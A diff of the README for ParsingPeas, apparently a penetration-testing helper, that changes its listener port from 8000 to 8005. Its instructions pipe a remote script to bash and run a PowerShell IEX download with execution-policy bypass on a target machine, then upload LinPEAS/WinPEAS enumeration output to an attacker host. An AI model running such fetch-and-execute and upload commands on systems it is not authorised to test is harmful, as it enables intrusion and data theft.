@@ -28,24 +28,24 @@ git clone https://github.com/YuvalMil/ParsingPeas.git
 cd ParsingPeas
 ./setup.sh              # Downloads LinPEAS/WinPEAS
 pip3 install -r requirements.txt
-python3 receiver.py     # Starts on http://0.0.0.0:8000
+python3 receiver.py     # Starts on http://0.0.0.0:8005
 ```
 
 ### On Target Machine
 
 **Linux/Unix:**
 ```bash
-curl -sSL http://YOUR_KALI_IP:8000/get-script | bash
+curl -sSL http://YOUR_KALI_IP:8005/get-script | bash
 ```
 
 **Windows (PowerShell):**
 ```powershell
-powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_KALI_IP:8000/get-script.ps1')"
+powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_KALI_IP:8005/get-script.ps1')"
 ```
 
 ### View Reports
 
-Navigate to `http://YOUR_KALI_IP:8000` in your browser.
+Navigate to `http://YOUR_KALI_IP:8005` in your browser.
 
 ---
 
@@ -67,25 +67,25 @@ If the one-liner fails:
 
 ```bash
 # On target
-curl http://KALI_IP:8000/get-linpeas -o /tmp/lp.sh
+curl http://KALI_IP:8005/get-linpeas -o /tmp/lp.sh
 chmod +x /tmp/lp.sh
 /tmp/lp.sh > /tmp/out.txt
 
 # Transfer
 curl -X POST -H "X-Hostname: $(hostname)" -H "X-Scan-Type: linpeas" \
-  --data-binary @/tmp/out.txt http://KALI_IP:8000/upload
+  --data-binary @/tmp/out.txt http://KALI_IP:8005/upload
 ```
 
 ### Windows
 
 ```powershell
 # On target (PowerShell)
-Invoke-WebRequest -Uri http://KALI_IP:8000/get-winpeas -OutFile $env:TEMP\wp.exe
+Invoke-WebRequest -Uri http://KALI_IP:8005/get-winpeas -OutFile $env:TEMP\wp.exe
 & "$env:TEMP\wp.exe" > $env:TEMP\out.txt
 
 # Transfer
 $hostname = $env:COMPUTERNAME
-Invoke-WebRequest -Uri http://KALI_IP:8000/upload `
+Invoke-WebRequest -Uri http://KALI_IP:8005/upload `
   -Method POST `
   -Headers @{"X-Hostname"=$hostname; "X-Scan-Type"="winpeas"} `
   -InFile $env:TEMP\out.txt
@@ -101,8 +101,8 @@ python3 parser.py /path/to/peas_output.txt
 ## Troubleshooting
 
 **Can't download script?**
-- Check connectivity: `curl http://KALI_IP:8000/health`
-- Open firewall: `sudo ufw allow 8000/tcp`
+- Check connectivity: `curl http://KALI_IP:8005/health`
+- Open firewall: `sudo ufw allow 8005/tcp`
 
 **404 errors?**
 - Run `./setup.sh` to download LinPEAS/WinPEAS
@@ -115,7 +115,7 @@ python3 parser.py /path/to/peas_output.txt
 ## Configuration
 
 Edit `receiver.py` to change:
-- Port (default: 8000)
+- Port (default: 8005)
 - Output directories
 - Max upload size (default: 10MB)
 
